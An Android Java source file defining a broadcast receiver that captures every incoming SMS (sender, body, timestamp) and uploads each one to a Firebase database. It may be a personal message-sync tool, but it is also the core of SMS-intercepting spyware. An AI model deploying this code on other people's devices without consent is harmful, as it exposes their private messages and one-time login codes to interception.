package com.example.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String message = sms.getMessageBody();
                    long timestamp = sms.getTimestampMillis();

                    // Push to Firebase
                    DatabaseReference ref = FirebaseDatabase.getInstance().getReference("sms_messages");
                    String key = ref.push().getKey();
                    if (key != null) {
                        ref.child(key).setValue(new SmsData(sender, message, timestamp));
                    }
                }
            }
        }
    }

    public static class SmsData {
        public String sender;
        public String message;
        public long timestamp;

        public SmsData() {}
        public SmsData(String sender, String message, long timestamp) {
            this.sender = sender;
            this.message = message;
            this.timestamp = timestamp;
        }
    }
}

